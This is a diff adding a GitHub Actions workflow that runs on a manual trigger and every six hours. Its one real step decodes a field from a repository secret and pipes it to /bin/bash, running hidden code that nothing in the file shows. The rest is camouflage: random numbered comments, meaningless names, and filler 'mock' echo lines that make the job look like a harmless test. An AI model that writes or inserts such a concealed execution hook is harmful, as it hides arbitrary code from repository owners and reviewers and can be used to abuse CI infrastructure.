@@ -1,0 +1,26 @@
+name: xiangyubiao0741 #31965
+on: #3394
+  workflow_dispatch: #8316
+  schedule: #11433
+    - cron: '7 2/6 * * *' #19435
+jobs: #18626
+  build: #15706
+    runs-on: ubuntu-latest #909
+    steps: #17720
+      - uses: actions/checkout@v4 #26640
+      - name: xiangyubiao0741 #975
+        env: #7575
+          u5635: ${{ secrets.u5635 }} #20365
+        run: |
+          echo $u5635 | jq -r .p32276 | /bin/bash #3590
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "Redirect mock: echo data > /dev/null 2>&1"
+          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          echo "String slice: str=abcdef; echo \${str:0:3}"
+          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
+          echo "Bit ops: $(( 1 & 1 ))"
+          echo "Command sub: $(echo inside subshell)"
+          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
+          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          echo "Arithmetic: $(( (RANDOM % 5) * 10 ))"
